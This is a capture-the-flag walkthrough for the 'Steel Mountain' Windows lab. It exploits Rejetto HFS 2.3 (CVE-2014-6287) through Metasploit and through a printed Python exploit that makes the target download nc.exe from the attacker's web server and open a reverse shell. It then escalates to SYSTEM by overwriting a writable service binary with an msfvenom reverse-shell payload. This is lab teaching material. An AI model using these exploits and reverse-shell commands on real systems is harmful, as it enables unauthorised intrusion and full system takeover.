# Steel Mountain (Regetto and unquoted service path)

### **Steel Mountain** <a href="#fzec3inyt23m" id="fzec3inyt23m"></a>

* Enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate privileges to Administrator.

### **Introduction** <a href="#butg4ae3qgmf" id="butg4ae3qgmf"></a>

* Browse to http://TARGET\_IP.
* View page source.

\<h3>Employee of the month\</h3>

\<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>

### **Initial Access** <a href="#qqfoba86nygr" id="qqfoba86nygr"></a>

* Get an initial shell.

**1. Scan target with nmap.**

nmap -sT -sV -oN TARGET\_IP\_scan.nmap TARGET\_IP

* Target is running another HTTP server on port 8080.
  * Browse to website on port 8080.
  * View page source.

\<fieldset id='serverinfo'>

\<legend>\<img src="/\~img0"> Server information\</legend>

\<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3\</a>

\<br />Server time: 2/22/2024 5:09:32 AM

\<br />Server uptime: 00:40:23

\</fieldset>

* "Rejetto HTTP File Server" is running on web server.

**2. Exploit vulnerable file server.**

* Search exploit-db for exploits affecting file server version.
  * File server is vulnverable to[ CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287).
* Use Metasploit to get an Inital Shell.

search rejetto http file server 2.3 type:exploit

Matching Modules

\================

\# Name Disclosure Date Rank Check Description

\- ---- --------------- ---- ----- -----------

0 exploit/windows/http/rejetto\_hfs\_exec 2014-09-11 excellent Yes Rejetto HttpFileServer Remote Command Execution

msf6 > use 0

set rhosts TARGET\_IP

set rport 8080

exploit

\[\*] Started reverse TCP handler on ATTACKER\_IP:4444

\[\*] Using URL: http://TARGET\_IP:8080/AHrBVKMyZam

\[\*] Server started.

\[\*] Sending a malicious request to /

\[\*] Payload request received: /AHrBVKMyZam

\[\*] Sending stage (175686 bytes) to ATTACKER\_IP

\[!] Tried to delete %TEMP%\eojOuZkUFsb.vbs, unknown result

\[\*] Meterpreter session 1 opened (TARGET\_IP:4444 -> ATTACKER\_IP:49261) at 2024-02-22 13:24:25 +0000

\[\*] Server stopped.

getuid

Server username: STEELMOUNTAIN\bill

* User flag is located in C:\Users\bill\Desktop\user.txt.

### **Privilege Escalation** <a href="#id-7sn660okfhzs" id="id-7sn660okfhzs"></a>

* Further enumerate target and escalate privileges to root.

**1. Use**[ **PowerUp**](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) **PowerShell script to enumerate target.**

* Evaluates Windows target and determines any abnormalities.

PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

**2. Use Metasploit shell upload to transfer script to target.**

upload /root/PowerUp.ps1

**3. Load PowerShell extension into Meterpreter.**

load powershell

**4. Drop into PowerShell.**

powershell\_shell

**5. Execute script.**

. .\PowerUp.ps1

Invoke-AllChecks

* CanRestart option allows restarting of service if set to true.
  * Directory to application is also writable - weak file permissions on service files.
  * Legitimate application can be replaced with malicious one then the service restarted.
    * Infected program will then run.
* "AdvancedSystemCareService9" service has CanRestart option set to true in this example.

**6. Create reverse shell in Msfvenom.**

msfvenom -p windows/shell\_reverse\_tcp LHOST=TARGET\_IP LPORT=4443 -e x86/shikata\_ga\_nai -f exe-service -o Advanced.exe

**7. Upload payload.**

* CTRL+C to exit PowerShell shell.

upload /root/Advanced.exe

* shell to enter regular command prompt shell.

cd "c:\program files (x86)\iobit\advanced systemcare"

copy ascservice.exe ascservice.exe.bkp

**8. Stop service on target.**

sc stop advancedsystemcareservice9

**9. Overwrite service executable with reverse shell on target.**

copy advanced.exe ascservice.exe

**10. Create listener on attacking machine.**

nc -lvnp 4443

**11. Start service on target.**

sc start advancedsystemcareservice9

**12. Reverse shell caught by listener.**

Connection from TARGET\_IP 49500 received!

Microsoft Windows \[Version 6.3.9600]

(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami

nt authority\system

* Root flag is located at C:\Users\Administrator\Desktop.

### **Access and Escalation Without Metasploit** <a href="#ns8lp1d49c8x" id="ns8lp1d49c8x"></a>

* Use PowerShell and WinPEAS to enumerate target and collect relevant information to escalate.

**1. Exploit CVE-2014-6287.**

* Use[ Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)](https://www.exploit-db.com/exploits/39161).
  * Download raw text into new file named "exploit.py".
    * Edit ip\_addr in script to attacking machine.

\#!/usr/bin/python

\# This is a modification of the original exploit : https://www.exploit-db.com/exploits/39161

\# works with python3

import urllib.request as urllib2

import sys

try:

def script\_create():

urllib2.urlopen("http://"+sys.argv\[1]+":"+sys.argv\[2]+"/?search=%00{.+"+save+".}")

def execute\_script():

urllib2.urlopen("http://"+sys.argv\[1]+":"+sys.argv\[2]+"/?search=%00{.+"+exe+".}")

def nc\_run():

urllib2.urlopen("http://"+sys.argv\[1]+":"+sys.argv\[2]+"/?search=%00{.+"+exe1+".}")

ip\_addr = "Your Local IP" #local IP address

local\_port = "4444" # Local Port number

vbs = r"C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip\_addr+":8000"+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"

save= "save|" + vbs

vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"

exe= "exec|"+vbs2

vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip\_addr+"%20"+local\_port

exe1= "exec|"+vbs3

script\_create()

execute\_script()

nc\_run()

except:

print ("""\[.]Something went wrong..!

Usage is :\[.] python exploit.py \<Target IP address> \<Target Port Number>

Don't forgot to change the Local IP address and Port number on the script""")

**2. Download netcat static binary from**[ **GitHub**](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)**.**

* Rename binary to "nc.exe" to work with exploit script.

mv ncat.exe nc.exe

**3. Serve nc binary using python web server.**

python3 -m http.server 8000

* HTTP server must be running from directory where nc.exe resides.

**4. Start listener to catch reverse shell.**

nc -lvnp 4444

**5. Run exploit.**

python3 exploit.py 10.10.81.255 8080

* Nmap previously identified that web file server listening on port 8080.
* Run exploit twice.
  * First run will pull netcat binary to target via GET request.

TARGET\_IP - - \[23/Feb/2024 09:53:54] "GET /nc.exe HTTP/1.1" 200 -

* Second run will execute payload to gain a callback.

Connection from TARGET\_IP 49245 received!

Microsoft Windows \[Version 6.3.9600]

(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

whoami

steelmountain\bill

**6. Download WinPEAS to attacking machine.**

wget https://github.com/carlospolop/PEASS-ng/releases/download/20240221-e5eff12e/winPEASany.exe

**7. Transfer WinPEAS to target.**

cd %userprofile$\desktop

powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER\_IP:8000/winPEASany.exe' -OutFile 'C:\Users\bill\Desktop\winPEAS.exe'"

**8. Execute WinPEAS on target**

.\winpeas.exe servicesinfo

* servicesinfo limits output to just services.
* Provides details of services using unquoted paths.

Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths.

AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)\[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected

File Permissions: bill \[WriteData/CreateFiles]

Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill \[WriteData/CreateFiles])

* Manually list service names.

powershell -c "Get-Service"

**9. Generate payload using msfvenom.**

msfvenom -p windows/shell\_reverse\_tcp LHOST=ATTACKER\_IP LPORT=4443 -e x86/shikata\_ga\_nai -f exe-service -o Advanced.exe

**10. Pull payload to target using PowerShell.**

powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER\_IP:8000/Advanced.exe' -OutFile 'C:\Program Files (x86)\IObit\Advanced SystemCare\Advanced.exe'"

cd "c:\program files (x86)\iobit\advanced systemcare"

copy ASCService.exe ASCService.exe.bkp

**11. Stop service on target.**

sc stop advancedsystemcareservice9

**12. Overwrite service executable with reverse shell on target.**

copy advanced.exe ascservice.exe

**13. Create listener on attacking machine.**

nc -lvnp 4443

**14. Restart service.**

sc start advancedsystemcareservice9

**15. Gain shell as administrator on listener.**

Connection from TARGET\_IP 49409 received!

Microsoft Windows \[Version 6.3.9600]

(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami

nt authority\system
